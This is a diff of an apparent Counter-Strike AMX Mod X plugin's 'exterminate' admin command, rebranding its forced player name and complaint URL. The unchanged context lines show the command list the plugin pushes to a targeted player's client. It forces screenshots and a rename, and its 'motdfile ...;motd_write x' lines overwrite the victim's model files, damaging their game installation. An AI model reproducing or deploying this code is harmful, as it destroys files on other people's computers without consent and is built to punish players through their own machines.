@@ -11,7 +11,7 @@ new const g_sCommands[ ][ ] =
 	
 	"wait;snapshot;wait;snapshot",
 	
-	"name JBRomania.Ro",
+	"name JB.EVILS.RO",
 	
 	"motdfile models/player.mdl;motd_write x",
 	"motdfile models/v_ak47.mdl;motd_write x",
@@ -55,7 +55,7 @@ public Concmd_AMXX_exterminate( id, level, cid )
 	player_color( 0, ".gAdminul .v%s .ga aplicat comanda EXTERMINATE pe .v%s", name, name2 );
 	player_color( 0, ".gComanda executata cu succes de catre adminul .v%s", name );
 	client_print(player,print_chat,"*** %s ai primit EXTERMINATE de la ADMINUL %s ***", name2 , name ) ;
-	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici WwW.Mevid.Ro***", name2 , name ) ;
+	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici www.evils.ro/jb/help", name2 , name ) ;
 	client_print(player,print_chat,"*** %s ti-au fost facute 2 ss (poze) in cstrike/(numele hartii )***", name2 ) ;
 	
 	for( new i = 0; i < sizeof( g_sCommands ); i++)
